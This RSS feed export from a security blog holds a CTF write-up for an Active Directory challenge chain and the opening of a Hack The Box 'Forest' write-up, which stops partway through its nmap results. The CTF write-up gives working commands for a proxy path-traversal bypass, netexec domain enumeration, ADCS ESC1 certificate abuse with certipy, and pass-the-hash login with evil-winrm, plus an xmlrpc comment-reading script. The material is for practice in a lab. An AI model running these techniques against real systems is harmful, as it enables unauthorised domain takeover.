<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>BloodHound on</title><link>https://blog.ikuamike.io/tags/bloodhound/</link><description>Recent content in BloodHound on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 17 Nov 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.ikuamike.io/tags/bloodhound/index.xml" rel="self" type="application/rss+xml"/><item><title>P3RF3CT R00T CTF 2024 Writeup - Active Directory</title><link>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</link><pubDate>Sun, 17 Nov 2024 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2024/p3rf3ctr00t_ctf_2024_ad/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/ctf_logo.jpg" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>This weekend I had some fun participating in the P3RF3CTR00T CTF 2024 by &lt;a href="https://twitter.com/p3rf3ctr00t" target="_blank" rel="noopener">p3rf3ctr00t&lt;/a>
ctf team, barely got some sleep. They really did a good job considering it&amp;rsquo;s their first edition of the CTF, I didn&amp;rsquo;t experience any downtime and support was very helpful on their discord server. They had over 50 challenges!&lt;/p>
&lt;p>Kudos to them, I am happy to see an evolution of CTFs in the Kenyan hacking scene. I have been playing CTFs for a while and this one gave me a fun challenge, at some point I was number 1. I was playing solo under &lt;strong>NoPwnNoGain&lt;/strong>.&lt;/p>
&lt;p>Alright, let&amp;rsquo;s get into the writeup. The AD category was a challenge to everyone, I got first blood on all 3 and even after 24 hrs I was the only solver. Later on there were additional solves but no one else got Domain Admin and finished it :).&lt;/p>
&lt;h2 id="attack">Attack&lt;/h2>
&lt;p>We start of with the challenge information. Important info here is the IP and the Artifact.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_1.png" class="center" style="border-radius: 8px;" />
&lt;p>We begin by running a full portscan on the target.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_2.png" class="center" style="border-radius: 8px;" />
&lt;p>We only get port 22 and 80 open, on port 80 we have a Wordpress site.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_3.png" class="center" style="border-radius: 8px;" />
&lt;p>I fired up wpscan, to get recon going as I clicked around the site to see what was posted.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://154.12.228.253/ -e ap,at,tt,cb,dbe,u --api-token --redacted-- -o wpscan.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From the scan, the only notable finding was the discovered user, we could also see the username on the site from a published post.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_4.png" class="center" style="border-radius: 8px;" />
&lt;p>After recon, the only logical next step was to target this user. Remember the &lt;strong>Artifact - Winterseason1234&lt;/strong> from the challenge info? Let&amp;rsquo;s test it as the password for this account.&lt;/p>
&lt;p>Unfortunately, when we try accessing /wp-admin we are forbidden. Based on the output, there&amp;rsquo;s a proxy blocking this access.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_5.png" class="center" style="border-radius: 8px;" />
&lt;p>So how do we test the credentials? Since I remember xmlrpc was accessible based on the wpscan output, I used metasploit&amp;rsquo;s &lt;code>wordpress_xmlrpc_login&lt;/code> module to check if the password is valid.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_6.png" class="center" style="border-radius: 8px;" />
&lt;p>Now that we confirm the password is valid, what next? We can&amp;rsquo;t access wp-admin.&lt;/p>
&lt;p>I got stuck here for some time doing various things against wordpress, I tried scanning again to see if I missed anything. I tried using xmlrpc to make modifications on the site but it has very limited functionality. Without much success, I decided that finding a bypass so as to access wp-admin was the only way forward.&lt;/p>
&lt;p>I tried several bypasses such as adding X-Forwared-For headers but no dice. Finally a little trickery with the URL worked.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_7.png" class="center" style="border-radius: 8px;" />
&lt;p>By using path traversal, I was able to bypass the proxy and get to Wordpress. As you can see we no longer get 403 Forbidden.&lt;/p>
&lt;p>The next step is to make sure I can comfortably do this on the browser. Burp&amp;rsquo;s Match and Replace for the win.&lt;/p>
&lt;p>I added the following rule that ensures, whenever I use &lt;code>/wp-admin&lt;/code> on the browser, Burp would replace it with &lt;code>/wp-content/../wp-admin&lt;/code> and forward it to the server.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_8.png" class="center" style="border-radius: 8px;" />
&lt;p>To make things smoother, I did the same for wp-login.php as well.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_9.png" class="center" style="border-radius: 8px;" />
&lt;p>Now we can comfortably login to wp-admin.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_10.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_11.png" class="center" style="border-radius: 8px;" />
&lt;p>With access to the admin panel, getting a shell is straighforward. We can modify one of the theme files to include our php shell payload. I initially did that, but later realized I had skipped the intended path. So let&amp;rsquo;s follow the intended path (which is easier).&lt;/p>
&lt;h3 id="wordstress-flag">WordStress Flag&lt;/h3>
&lt;p>In the comments, there&amp;rsquo;s one comment that is in the trash. This includes the WordStress flag and the password to crocodile on the host.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_12.png" class="center" style="border-radius: 8px;" />
&lt;p>WordStress Flag: &lt;code>r00t{well_lif3_1s_T00_h4rD_w1d_p0xies_pixies}&lt;/code>&lt;/p>
&lt;p>We can now comfortably ssh into the box. The important bit, was to ensure we specify the domain. This was not a local user but a user on Active Directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_13.png" class="center" style="border-radius: 8px;" />
&lt;p>This was easier for me since I initially got access to the box via a reverse shell and discovered the domain name.&lt;/p>
&lt;p>I would imagine, it wouldn&amp;rsquo;t have been so intuitive to provide the domain name on the first try. Even though on the comment we are given some sort of hint, I bet it wouldn&amp;rsquo;t have been a quick thing to figure out.&lt;/p>
&lt;h3 id="calm-belt-flag">Calm Belt Flag&lt;/h3>
&lt;p>Once logged in we have access to the next flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_14.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{Th3_calm_b3lt_isnt_s0_calm}&lt;/code>&lt;/p>
&lt;p>After some local recon, the next step seemed to point to attacking Active Directory no need for privesc to root.&lt;/p>
&lt;p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_15.png" class="center" style="border-radius: 8px;" />
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_16.png" class="center" style="border-radius: 8px;" />
&lt;/p>
&lt;p>We now have the IP of what could be Domain Controller as that&amp;rsquo;s where our DNS is pointed to. I&amp;rsquo;ll use this linux box to proxy traffic to the DC and attack directly from my local kali machine.&lt;/p>
&lt;p>Let&amp;rsquo;s setup a socks proxy over SSH.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh -D &lt;span style="color:#ae81ff">1080&lt;/span> &lt;span style="color:#e6db74">&amp;#39;crocodile@grandline.local&amp;#39;&lt;/span>@154.12.228.253
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I&amp;rsquo;ll point my proxychains config to 127.0.0.1 1080 and everything is all set. I&amp;rsquo;ll begin by using netexec as it has a lot of good features built-in.&lt;/p>
&lt;p>I am able to confirm that the IP we have is indeed for the domain controller and the credentials for the crocodile user are valid for the domain.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_17.png" class="center" style="border-radius: 8px;" />
&lt;p>Now let&amp;rsquo;s do some more recon on the domain.&lt;/p>
&lt;h4 id="domain-users">Domain Users:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --users
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>There were many users present, but since the password for most of them were set in the same minute. I chose to consider only a few who were interesting and had different password set times meaning they could have some significance in the challenge.&lt;/p>
&lt;ol>
&lt;li>Administrator&lt;/li>
&lt;li>krbtgt&lt;/li>
&lt;li>sanji&lt;/li>
&lt;li>crocodile&lt;/li>
&lt;li>koala&lt;/li>
&lt;/ol>
&lt;p>The user sanji is also present in the linux box.&lt;/p>
&lt;h4 id="domain-computers">Domain Computers:&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --computers
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Only two are present.&lt;/p>
&lt;ol>
&lt;li>\calmbelt$ (our Linux box)&lt;/li>
&lt;li>grandline.local\DC$ (the DC)&lt;/li>
&lt;/ol>
&lt;h4 id="network-shares">Network Shares&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec smb 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --shares
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>One of the network shares was interesting to me, since it&amp;rsquo;s not usually present by default. This signalled to me that we have ADCS configured and it could potentially be our attack vector.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_18.png" class="center" style="border-radius: 8px;" />
&lt;h4 id="bloudhound">BloudHound&lt;/h4>
&lt;p>Netexec also has the option to collect data for use in bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q netexec ldap 94.72.112.254 -u crocodile -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> --bloodhound --dns-server 94.72.112.254 -c All
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_19.png" class="center" style="border-radius: 8px;" />
&lt;p>In bloodhound, when we look at the information about the interesting users we previously got. Sanji seems to have additional privileges on the Domain. He is part of the &lt;code>Remote Management Users&lt;/code> group.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_20.png" class="center" style="border-radius: 8px;" />
&lt;p>This means, we may need to first get access as sanji. I remembered that during my local recon on the linux box there was a ccache file for sanji in /tmp.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_21.png" class="center" style="border-radius: 8px;" />
&lt;p>After downloading the file to my local machine, I imported the ccache file and could now use it for kerberos authentication auth as sanji. For netexec we need to specify &lt;code>--use-kcache&lt;/code>.&lt;/p>
&lt;p>proxychains -q netexec smb 94.72.112.254 &amp;ndash;use-kcache&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_22.png" class="center" style="border-radius: 8px;" />
&lt;p>At this point, this was well and good but I still couldn&amp;rsquo;t use this access to connect to the DC. So I switched to trying out ADCS. Since we noted it was present when we did recon on the available shares.&lt;/p>
&lt;p>I used certipy and specified -old-bloodhound, so I can import the results into the bloodhound.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy find -u crocodile@grandline.local -p &lt;span style="color:#e6db74">&amp;#39;Cr0c0d1le_tears_lol1234&amp;#39;&lt;/span> -dc-ip 94.72.112.254 -old-bloodhound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_23.png" class="center" style="border-radius: 8px;" />
&lt;p>From Bloodhound, we can see that we have 2 certificates that we can use for ESC1 attack.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_24.png" class="center" style="border-radius: 8px;" />
&lt;p>If we checked from our owned principals, we see that we can use sanji to abuse this.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_25.png" class="center" style="border-radius: 8px;" />
&lt;p>From certipy output (if you don&amp;rsquo;t provide the -old-bloodhound option), we can confirm that sanji has rights on this certificate. This is also the challenge name, so it was a no brainer this was the intended path.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_26.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="marinford-degree-flag">Marinford Degree Flag&lt;/h3>
&lt;p>Now we can exploit this and get administrator access and access the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy req -k -ca grandline-DC-CA -target dc.grandline.local -template Marinford_Degree -upn administrator@grandline.local -dns-tcp -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_27.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q certipy auth -pfx administrator_dc.pfx -dc-ip 94.72.112.254
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_28.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>proxychains -q evil-winrm -i 94.72.112.254 -u administrator -H d8dabcadf488114f7c5a46604fb26235
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_29.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>r00t{C3rtificate_f0r_grandline_wh4t_a_j0ke_I_can_for9e}&lt;/code>&lt;/p>
&lt;h2 id="extras">Extras&lt;/h2>
&lt;h3 id="using-xmlrpcphp">Using xmlrpc.php&lt;/h3>
&lt;p>After finishing the CTF, I got this idea. Since I was playing around with xmlrpc, could we have just accessed the comment in trash using xmlrpc? Then we don&amp;rsquo;t need to struggle with the 403 bypass. Even though xmlrpc functionality is limited. It can pretty much read most of the things on wordpress.&lt;/p>
&lt;p>ChatGPT for the win. ChatGPT wrote for me this python script that I could use to read the hidden comment and flag. Awesome!&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-py" data-lang="py">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> xmlrpc.client
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress site XML-RPC URL&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://154.12.228.253/xmlrpc.php&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># WordPress login credentials&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;crocodile&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wp_password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Winterseason1234&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Create the XML-RPC client&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>client &lt;span style="color:#f92672">=&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>ServerProxy(wp_url)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Define the parameters to get comments in the trash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>comment_filter &lt;span style="color:#f92672">=&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;status&amp;#39;&lt;/span>: &lt;span style="color:#e6db74">&amp;#39;trash&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># Filter comments with status &amp;#39;trash&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Call the wp.getComments method&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> comments &lt;span style="color:#f92672">=&lt;/span> client&lt;span style="color:#f92672">.&lt;/span>wp&lt;span style="color:#f92672">.&lt;/span>getComments(&lt;span style="color:#ae81ff">0&lt;/span>, wp_username, wp_password, comment_filter)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Check if any comments are found&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Comments in Trash:&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> comment &lt;span style="color:#f92672">in&lt;/span> comments:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;comment_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Post ID: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;post_id&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Author: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;author&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Content: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;content&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Date: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>comment[&lt;span style="color:#e6db74">&amp;#39;date_created_gmt&amp;#39;&lt;/span>]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;-&amp;#34;&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">40&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;No comments found in the trash.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">except&lt;/span> xmlrpc&lt;span style="color:#f92672">.&lt;/span>client&lt;span style="color:#f92672">.&lt;/span>Fault &lt;span style="color:#66d9ef">as&lt;/span> e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Error occurred: &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_30.png" class="center" style="border-radius: 8px;" />
&lt;p>During the CTF, it definitely wouldn&amp;rsquo;t have been the first thing to try, but still interesting to see that it works.&lt;/p>
&lt;p>I&amp;rsquo;m not sure the author knew this was possible. This is a clear indication that blocking access to the wp-admin portal doesn&amp;rsquo;t really fully protect the wordpress instance, xmlrpc has some useful functionality! This is if you have valid credentials. Most online resources around attacking wordpress using xmlrpc don&amp;rsquo;t really cover this.&lt;/p>
&lt;p>There is potential to write an script that goes through xmlrpc and dumps various info if wp-admin is blocked. I hope you the reader can look into it. I surely will.&lt;/p>
&lt;p>It tried using wp-json as well but I didn&amp;rsquo;t succeed.&lt;/p>
&lt;h3 id="haproxy-configuration">HAProxy configuration&lt;/h3>
&lt;p>I was also curious about was the config used to block access to wp-admin and wp-login.&lt;/p>
&lt;p>Looking at the haproxy config at &lt;code>/etc/haproxy/haproxy.cfg&lt;/code>, we can see the regex was quite basic and only focused on the standard url.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/p3rf3ctr00t_ctf_2024/wordstress_31.png" class="center" style="border-radius: 8px;" />
&lt;p>Therefore it was possible to bypass with other variations such as:&lt;/p>
&lt;ul>
&lt;li>/wp-content/../wp-admin/&lt;/li>
&lt;li>/./wp-admin&lt;/li>
&lt;li>/a/../wp-admin&lt;/li>
&lt;li>//wp-admin&lt;/li>
&lt;/ul>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>This was good challenge, especially the first part where the linux box is part of the domain that was unique. Cheers to the author &lt;a href="https://x.com/byronchris25" target="_blank" rel="noopener">Winter&lt;/a>
. Thanks for reading to the end!&lt;/p></content></item><item><title>Hack The Box: Forest</title><link>https://blog.ikuamike.io/posts/2022/forest-htb/</link><pubDate>Tue, 01 Mar 2022 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2022/forest-htb/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/forest/logo.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>After passing my OSCP, I am planning on doing CRTP and CRTO sometime this year. I took the OSCP exam before the updates that are focused on Active
Directory so I didn&amp;rsquo;t actively focus on this area.&lt;/p>
&lt;p>So to learn and practice on AD and Windows and also as some prep for the certifications I plan on taking, I will be doing some machines that are AD
related and try to get into the details of the included misconfigurations and vulnerabilities.&lt;/p>
&lt;p>For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.&lt;/p>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;p>Open ports as found by nmap.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.161
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.20s latency&lt;span style="color:#f92672">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain Simple DNS Plus
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>88/tcp open kerberos-sec Microsoft Windows Kerberos &lt;span style="color:#f92672">(&lt;/span>server time: 2022-02-25 16:32:33Z&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Microsoft Windows netbios-ssn
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>389/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds &lt;span style="color:#f92672">(&lt;/span>workgroup: HTB&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>636/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span style="color:#f92672">(&lt;/span>Domain: htb.local, Site: Default-First-Site-Name&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>3269/tcp open tcpwrapped
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>9389/tcp open mc-nmf .NET Message Framing
